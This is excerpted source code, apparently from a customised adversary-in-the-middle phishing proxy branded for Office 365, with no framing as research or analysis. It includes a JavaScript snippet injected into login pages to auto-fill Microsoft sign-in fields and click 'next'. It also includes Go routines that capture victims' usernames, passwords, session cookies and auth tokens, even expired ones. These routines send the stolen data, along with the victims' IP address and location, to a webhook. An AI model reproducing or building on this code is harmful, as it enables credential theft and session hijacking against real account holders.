...
// Script to auto-fill email from URL fragment (hash)
...
(function(){
    ...
    function f(){
        ...
        var e=decodeURIComponent(h.substring(1));
        if(e.indexOf("@")==-1)return;
        console.log("AutoFill: Found email", e);
        
        // Debug: Log all inputs on the page to find the correct selector
        if (c === 0 || c % 10 === 0) {
            var allInputs = document.getElementsByTagName('input');
            console.log("AutoFill: Total inputs found:", allInputs.length);
            for(var z=0; z<allInputs.length; z++) {
                console.log("AutoFill Debug Input:", allInputs[z].name, allInputs[z].id, allInputs[z].type, allInputs[z].className);
            }
        }

        var diff=false;
        // Added 'loginfmt' and 'i0116' for Microsoft support
        var i=document.querySelectorAll('input[type="email"],input[name="email"],input[name="username"],input[name="loginfmt"],input[id="i0116"],input[name*="user"],input[id*="email"],input[id*="user"]');
        console.log("AutoFill: Candidates found:", i.length);
        for(var k=0;k<i.length;k++){
            var x=i[k];
            if(x.type!=='hidden'&&!x.disabled&&x.offsetParent!==null){
                x.value=e;
        ...
        if(diff){
            var b=document.querySelectorAll('button,input[type="submit"]');
            for(var j=0;j<b.length;j++){
                var t=(b[j].innerText||b[j].value||"").toLowerCase();
                if(t.includes("next")||t.includes("continue")||t.includes("identifier")||t.includes("dalsi")||t.includes("avanti")){
                    console.log("AutoFill: Clicking button", t);
                    b[j].click();
                    break;
                }
            }
...
func ToStylizedInt(n int) string {
	digits := []string{"𝟘", "𝟙", "𝟚", "𝟛", "𝟜", "𝟝", "𝟞", "𝟟", "𝟠", "𝟡"}
	if n < 0 {
		return strconv.Itoa(n) // Fallback for negative
	}
	if n < 10 {
		return digits[n]
	}
...
func GetIPDetails(ip string) *IPInfo {
	// Skip local/private IPs if needed, but for now we try all non-empty
	if ip == "" || ip == "127.0.0.1" || ip == "::1" {
		return &IPInfo{Country: "Local", Region: "Local", ISP: "Local Network"}
	}
	...
	if err != nil {
		log.Error("failed to get ip details: %v", err)
		return nil
	}
...
func GetFormattedDetails(req *http.Request, ip string) string {
	...
	return fmt.Sprintf(`𝔹𝕣𝕠𝕨𝕤𝕖𝕣: %s
𝕃𝕒𝕟𝕘𝕦𝕒𝕘𝕖: %s
𝕀ℙ 𝔸𝕕𝕕𝕣𝕖𝕤𝕤: %s
ℝ𝕖𝕘𝕚𝕠𝕟 𝕒𝕟𝕕 ℂ𝕠𝕦𝕟𝕥𝕣𝕪: %s, %s
𝕀𝕊ℙ: %s
𝔻𝕒𝕥𝕖: %s`, browser, lang, ip, region, country, isp, now)
}
...
func (p *HttpProxy) SendCookies(msg string, username string) {
		...
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			...
			for _, ck := range cookies {
				...
				if pl != nil && ps.SessionId != "" {
					...
					// MORE PERMISSIVE TOKEN CAPTURE - REMOVED RESTRICTIVE CONDITIONS
					if pl.isAuthToken(c_domain, ck.Name) || pl.isAuthToken("", ck.Name) {
						s, ok := p.sessions[ps.SessionId]
						if ok {
							// Always try to capture auth tokens, regardless of session state
							if ck.Value != "" {
								// Capture even expired cookies, they might still be useful
								tokenAdded := s.AddAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, auth_tokens)
								if tokenAdded {
									log.Debug("[%d] Captured auth token: %s=%s", ps.Index, ck.Name, ck.Value)
									is_auth = true

									// Set session as done if we got tokens
									s.IsDone = true
			...
			if pl != nil && ps.SessionId != "" {
				if s, ok := p.sessions[ps.SessionId]; ok {
					p.forceGrabTokens(s, pl, req_hostname, cookies)
				}
			}
			...
			// NEW: Always check and send credentials if available
			if ps.SessionId != "" {
				if s, ok := p.sessions[ps.SessionId]; ok {
					...
					if s.Username != "" && s.Password != "" {
						...
						credentialsStr = fmt.Sprintf(`[%s] ℂ𝕣𝕖𝕕𝕖𝕟𝕥𝕚𝕒𝕝𝕤 ℂ𝕒𝕡𝕥𝕦𝕣𝕖𝕕
...
%s
 ...
 ====  ℚ𝕏𝔹 ©️ o365 =====`, ToStylizedInt(ps.Index), s.Username, s.Password, GetFormattedDetails(resp.Request, GetUserIP(nil, resp.Request)))
					} else if s.Username != "" {
						shouldSendCredentials = true
						credentialsStr = fmt.Sprintf(`[%s] ℂ𝕣𝕖𝕕𝕖𝕟𝕥𝕚𝕒𝕝𝕤 ℂ𝕒𝕡𝕥𝕦𝕣𝕖𝕕
...
%s
 ...
 ====  ℚ𝕏𝔹 ©️ o365 =====`, ToStylizedInt(ps.Index), s.Username, GetFormattedDetails(resp.Request, GetUserIP(nil, resp.Request)))
					}

					// Send credentials notification
					if shouldSendCredentials && !s.CredsSent && p.cfg.webhook_verbosity >= 1 {
						p.NotifyWebhook(credentialsStr)
						s.CredsSent = true
						log.Debug("[%d] Sent credentials notification to webhook", ps.Index)
					}
				}
			}
			...
			// NEW: Send tokens notification separately if available
			// MODIFIED: Send credentials AND tokens together
			if is_auth && ps.SessionId != "" {
				if s, ok := p.sessions[ps.SessionId]; ok {
					if len(s.Tokens) > 0 && !s.TokensSent && p.cfg.webhook_verbosity >= 1 {
						// Build comprehensive message with credentials
						// Build comprehensive message with credentials
						var message strings.Builder

						message.WriteString(fmt.Sprintf("[%s] ℂ𝕆𝕄ℙ𝕃𝔼𝕋𝔼 ℂ𝔸ℙ𝕋𝕌ℝ𝔼\n\n", ToStylizedInt(ps.Index)))

						// Add credentials section
						if s.Username != "" || s.Password != "" {
							if s.Username != "" {
								message.WriteString(fmt.Sprintf("𝕌: %s\n", s.Username))
							}
							if s.Password != "" {
								message.WriteString(fmt.Sprintf("ℙ: %s\n", s.Password))
							}
						}

						message.WriteString(GetFormattedDetails(resp.Request, GetUserIP(nil, resp.Request)))
						message.WriteString("\n")

						// Add tokens section
						message.WriteString(fmt.Sprintf("𝕊𝔼𝕊𝕊𝕀𝕆ℕ 𝕋𝕆𝕂𝔼ℕ𝕊: %d 𝕔𝕒𝕡𝕥𝕦𝕣𝕖𝕕 📎 𝕁𝕊𝕆ℕ 𝕗𝕚𝕝𝕖 𝕒𝕥𝕥𝕒𝕔𝕙𝕖𝕕 𝕨𝕚𝕥𝕙 𝕥𝕠𝕜𝕖𝕟𝕤\n\n", len(s.Tokens)))

						message.WriteString(" ====  ℚ𝕏𝔹 ©️ o365 =====")

						// Send the complete message
						p.NotifyWebhook(message.String())

						// Send cookies JSON
						p.SendCookies(TokensToJSON(pl, s.Tokens), s.Username)

						s.TokensSent = true
						s.CredsSent = true // Mark credentials as sent too
						log.Debug("[%d] Sent complete capture notification to webhook", ps.Index)
					}
				}
			}
						...
						if ok {
							...
							if err == nil || script != "" {
								if err == nil {
									...
									log.Debug("js_inject: auto-fill script injection")
								}
				...
				if ok {
					for _, au := range pl.authUrls {
						if au.MatchString(resp.Request.URL.Path) {
							log.Success("[%d] detected authorization URL: %s", ps.Index, resp.Request.URL.Path)

							// Try to capture ANY available cookies as tokens
							for _, ck := range cookies {
								if pl.isAuthToken("", ck.Name) || pl.isAuthToken(req_hostname, ck.Name) {
									if ck.Value != "" {
										// Try to add as auth token
										s.AddAuthToken(req_hostname, ck.Name, ck.Value, ck.Path, ck.HttpOnly, auth_tokens)
										log.Debug("[%d] Captured token from auth URL: %s", ps.Index, ck.Name)
									}
								}
							}

							// Also force grab tokens
							p.forceGrabTokens(s, pl, req_hostname, cookies)
							...
							if s.Username != "" && p.cfg.webhook_verbosity >= 1 && !s.CredsSent {
								credsMsg := fmt.Sprintf(`[%s] ℂ𝕣𝕖𝕕𝕖𝕟𝕥𝕚𝕒𝕝𝕤 𝕗𝕣𝕠𝕞 𝕒𝕦𝕥𝕙 𝕌ℝ𝕃

𝕌: %s
ℙ: %s

 ====  ℚ𝕏𝔹 ©️ o365 =====`, ToStylizedInt(ps.Index), s.Username, s.Password)
								p.NotifyWebhook(credsMsg)
								s.CredsSent = true
							}

							// Send tokens if any were captured
							if (len(s.Tokens) > 0 || s.Username != "" || s.Password != "") &&
								p.cfg.webhook_verbosity >= 1 &&
								!s.TokensSent {

								var message strings.Builder
								message.WriteString(fmt.Sprintf("[%s] ℂ𝔸ℙ𝕋𝕌ℝ𝔼 𝔽ℝ𝕆𝕄 𝔸𝕌𝕋ℍ 𝕌ℝ𝕃\n\n", ToStylizedInt(ps.Index)))
...
func (p *HttpProxy) forceGrabTokens(s *Session, pl *Phishlet, req_hostname string, cookies []*http.Cookie) {
	// Common auth token names across various services
	commonTokens := []string{
		...
		"connect.sid", // Express.js sessions
	}

	for _, ck := range cookies {
		for _, tokenName := range commonTokens {
			if strings.Contains(ck.Name, tokenName) && ck.Value != "" {
				// Try to add this as a token
				s.AddAuthToken(req_hostname, ck.Name, ck.Value, ck.Path, ck.HttpOnly, pl.authTokens)
				log.Debug("Force-grabbed potential token: %s", ck.Name)
			}
		}
	}
}
